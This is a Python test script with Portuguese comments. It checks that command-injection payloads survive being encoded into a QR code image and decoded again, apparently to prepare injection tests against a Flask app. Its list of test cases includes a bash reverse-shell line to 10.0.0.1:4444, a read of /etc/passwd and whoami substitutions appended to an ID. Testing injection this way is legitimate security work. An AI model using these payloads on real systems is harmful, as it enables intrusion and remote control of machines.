"""Teste de camada 1 (lógica isolada, fora do Flask): confirma que caracteres
especiais usados em payloads de command injection sobrevivem ao ciclo completo
geração de imagem de QR Code -> decodificação -> leitura da string, sem
corrupção.

Roda fora do container, sem precisar do app Flask no ar.
"""

import io

import qrcode
from PIL import Image
from pyzbar.pyzbar import decode

CASOS = [
    "202012345",
    "123; id",
    "123; bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'",
    "`whoami`",
    "$(whoami)",
    "123 && echo teste",
    "123 | cat /etc/passwd",
    "aspas 'simples' e \"duplas\"",
]


def gerar_imagem_qrcode(conteudo):
    qr = qrcode.QRCode(error_correction=qrcode.constants.ERROR_CORRECT_M)
    qr.add_data(conteudo)
    qr.make(fit=True)
    imagem = qr.make_image(fill_color="black", back_color="white").convert("RGB")
    buffer = io.BytesIO()
    imagem.save(buffer, format="PNG")
    buffer.seek(0)
    return buffer


def decodificar(buffer_imagem):
    imagem = Image.open(buffer_imagem)
    resultados = decode(imagem)
    if not resultados:
        return None
    return resultados[0].data.decode("utf-8", errors="replace").strip()


def main():
    falhas = 0
    for caso in CASOS:
        buffer = gerar_imagem_qrcode(caso)
        decodificado = decodificar(buffer)
        ok = decodificado == caso
        status = "OK " if ok else "FAIL"
        print(f"[{status}] entrada={caso!r} -> decodificado={decodificado!r}")
        if not ok:
            falhas += 1

    print()
    if falhas:
        print(f"{falhas}/{len(CASOS)} casos falharam — ciclo QR corrompe payload.")
        raise SystemExit(1)

    print(f"Todos os {len(CASOS)} casos sobreviveram ao ciclo QR intactos.")


if __name__ == "__main__":
    main()
